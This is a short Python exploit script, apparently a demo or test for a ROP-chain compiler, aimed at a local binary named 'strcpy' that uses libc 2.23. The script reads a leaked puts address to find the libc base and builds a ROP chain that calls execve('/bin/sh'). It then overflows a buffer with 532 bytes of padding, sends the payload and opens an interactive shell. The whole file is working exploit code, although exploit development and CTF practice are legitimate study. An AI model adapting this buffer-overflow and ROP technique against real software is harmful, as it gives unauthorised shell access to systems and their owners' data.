import sys, logging, binascii, os
from pwn import *
from rop_compiler import ropme

filename = './strcpy'
libc, libc_gadgets = "./libc-2.23.so", "libc.gadgets"

# Make sure we get the right libc
os.environ["LD_LIBRARY_PATH"] = os.path.dirname(libc)

elf = ELF(libc)
p = process([filename])
assert p.libc.path == os.path.abspath(os.path.join(os.path.dirname(libc), 'libc.so.6'))  # Ensure we use the libc that we've pulled gadgets from
#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x0804865d\n")

libc_address = int(p.readline().split(":")[1].strip(), 16) - elf.symbols["puts"]
files = [(filename, None, None), (libc, libc_gadgets, libc_address)]
libraries = [libc]

rop = ropme.rop(files, libraries, [["execve", "/bin/sh"]], log_level = logging.DEBUG, bad_bytes = "\x00")
payload = 'A'*512 + 'B'*20 + rop

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline(payload)
p.interactive()
